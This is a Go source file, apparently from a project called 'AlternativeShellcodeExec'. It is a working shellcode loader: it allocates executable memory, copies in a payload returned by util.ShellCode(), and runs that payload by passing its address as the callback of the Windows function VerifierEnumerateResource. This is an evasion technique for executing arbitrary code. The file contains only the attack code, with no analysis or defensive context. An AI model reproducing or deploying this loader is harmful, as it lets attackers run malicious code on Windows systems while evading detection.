package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

type VerifierEnumResourceFn = func(
	process syscall.Handle,
	flags uintptr,
	resourceType uint32,
	resourceCallback uintptr,
	enumerationContext uintptr,
) uintptr

// Run is the main function to process op
func Run(op []byte) {
	// Load required Windows libraries
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	//ntdll := syscall.MustLoadDLL("ntdll.dll")
	verifier := syscall.MustLoadDLL("verifier.dll")

	// Load required Windows functions
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	//virtualFree := kernel32.MustFindProc("VirtualFree")
	getCurrentProcess := kernel32.MustFindProc("GetCurrentProcess")
	//rtlMoveMemory := ntdll.MustFindProc("RtlMoveMemory")
	verifierEnumerateResource := verifier.MustFindProc("VerifierEnumerateResource")

	// Allocate memory with required permissions
	address, _, err := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if address == 0 {
		fmt.Printf("VirtualAlloc failed with error: %v\n", err)
		return
	}
	//defer virtualFree.Call(address, 0, 0x8000) // MEM_RELEASE

	// Copy op into the allocated memory using a for loop
	for i := range op {
		*(*byte)(unsafe.Pointer(address + uintptr(i))) = op[i]
	}

	// Get current process
	process, _, err := getCurrentProcess.Call()

	if process == 0 {
		fmt.Printf("GetCurrentProcess failed with error: %v\n", err)
		return
	}

	ret, _, err := verifierEnumerateResource.Call(process, 0, 0, address, 0)
	if ret == 0 {
		fmt.Printf("VerifierEnumerateResource failed with error: %v\n", err)
		return
	} else {
		fmt.Println("VerifierEnumerateResource completed successfully.")
	}
}

func main() {
	Run(util.ShellCode())
}
